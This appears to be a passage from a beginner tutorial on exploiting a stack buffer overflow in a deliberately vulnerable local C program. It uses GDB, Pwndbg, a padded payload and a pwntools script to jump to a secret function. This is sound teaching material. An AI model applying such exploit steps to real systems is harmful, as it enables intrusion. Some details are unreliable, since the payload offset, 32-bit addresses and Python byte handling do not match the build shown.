## Crafting and Sending Payloads in Buffer Overflow Exploits**
we’ll go through the process of exploiting a buffer overflow vulnerability in a C program using **Pwndbg** for reverse engineering and crafting payloads.
### **Prerequisites**
- **Pwndbg installed**: Install it by following the instructions on the [Pwndbg GitHub](https://github.com/pwndbg/pwndbg).
    ```bash
    git clone https://github.com/pwndbg/pwndbg
    cd pwndbg
    ./setup.sh
    ```
- **GDB installed**: Ensure you have GDB installed to use Pwndbg.
- **Basic knowledge of buffer overflows**: This guide assumes you know what buffer overflows are and how they work at a basic level.
- **A target vulnerable program**: This guide will assume the vulnerable program is the same as in the Pwntools example above.

### **1. Analyzing the Vulnerability Using Pwndbg**
#### **Vulnerable Program (vulnerable_program.c)**
This is the same C program used in the Pwntools section. It contains a buffer overflow vulnerability due to the `gets()` function.

```c
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("You've triggered the secret function!\n");
}

void vulnerable_function() {
    char buffer[64];
    printf("Enter a string: ");
    gets(buffer);  // Vulnerable to buffer overflow
}

int main() {
    vulnerable_function();
    return 0;
}
```

#### **Compiling the Program**
Compile the program with debugging symbols and disable stack protection to make exploitation easier:
```bash
gcc -g -fno-stack-protector -z execstack vulnerable_program.c -o vulnerable_program
```

### **2. Setting Up Pwndbg and GDB**
To start debugging with Pwndbg, run the program inside GDB with the Pwndbg extension enabled:

```bash
gdb ./vulnerable_program
```

This will start GDB with the Pwndbg extension loaded.

### **3. Finding the Buffer Overflow Vulnerability**
In GDB, use Pwndbg to analyze the stack and memory layout:
1. **Disassemble the `vulnerable_function`** to see the buffer and where the return address is stored:
    ```bash
    disasssemble vulnerable_function
    ```
    
    This will show you where the `buffer[64]` is allocated on the stack, and where the return address is.
2. We look for all the functions in the program by running:
```
info functions
```
3. Set our breakpoint to one of these functions
4. **Check the Stack**: Once you know the buffer’s position, you can inspect the stack using Pwndbg’s commands to see where the return address lies relative to the buffer.
    In Pwndbg, use:
    ```bash
    context
    ```
    
    This will display the current state of the stack, registers, and nearby memory in an easy-to-read format. Look for the buffer and the saved return address.
    
5. **Find the address of the `secret_function`**: To redirect the program’s execution to `secret_function`, we need its memory address.
    In GDB, disassemble the `secret_function`:
    ```bash
    disas secret_function
    ```
    
    This will give you the address of `secret_function`, for example `0x080484b6`.
    

### **4. Calculating the Payload**

The goal of the exploit is to:
- **Overflow the buffer** (64 bytes).
- **Overwrite the return address** with the address of `secret_function` (e.g., `0x080484b6`).

#### **Payload Structure**:
- **64 bytes**: Fill the buffer.
- **4 bytes**: Overwrite the saved return address with the address of `secret_function`.


#### **Crafting the Payload in GDB**

Once you have the address of `secret_function`, you can craft your payload. You will need 64 bytes of padding (the size of the buffer) followed by the 4-byte address of `secret_function`.

To construct the payload directly in GDB, use the following:

```bash
python -c "print('A'*64 + '\xb6\x84\x04\x08')" > payload.txt
```

This creates a payload with 64 "A"s followed by the address `0x080484b6` (the address of `secret_function`, written in little-endian format).

### **5. Debugging and Exploiting the Vulnerability**

#### **Step 1: Run the Program and Set a Breakpoint**
In GDB, set a breakpoint at the vulnerable function to stop before the overflow occurs:

```bash
b vulnerable_function
run
```

#### **Step 2: Examine the Stack and Registers**
Once the program breaks, use Pwndbg to examine the stack and the registers:

```bash
context
```

This will give you a comprehensive view of the current function call, including the stack and any useful information about the buffer’s location.

#### **Step 3: Overflow the Buffer**
After gathering information about the buffer and the return address, you can send the payload.
Use the following GDB commands to send the crafted payload:
```bash
r < payload.txt
```

This will start the program and send the payload you crafted, which should overflow the buffer and redirect the execution to `secret_function`.

#### **Step 4: Check for Output**

If everything works, you should see the output from the `secret_function`:
```
You've triggered the secret function!
```

### **6. Automating the Exploit with Python and Pwndbg**
To automate this process, you can use Python in combination with GDB.
Here’s how you can automate the process using Python to send the payload:

```python
from pwn import *

# Set up the process (local)
p = process('./vulnerable_program')

# Address of secret_function (from gdb or objdump)
secret_function_address = p32(0x080484b6)  # Replace with actual address

# Payload: 64 bytes to overflow the buffer + address of secret_function
payload = b"A" * 64 + secret_function_address

# Interact with the process
p.recvuntil("Enter a string: ")  # Wait for the prompt
p.sendline(payload)  # Send the payload

# Receive the output (i.e., the result of triggering the secret function)
output = p.recvall()
print(output.decode())  # Print the output
```

### **7. Using Pwndbg Commands for Reverse Engineering**
- **Inspect registers**:
    ```bash
    info registers
    ```
- **View memory at a specific address**:
    ```bash
    x/32x $esp
    ```
    
- **Dump the entire stack**:
    ```bash
    x/64x $esp
    ```
    
- **View disassembly of a function**:
    ```bash
    disas <function_name>
    ```
    
- **View the context (stack, registers, etc.)**:
    ```bash
    context
    ```
    
- **Check the stack trace**:
    ```bash
    bt
    ```
    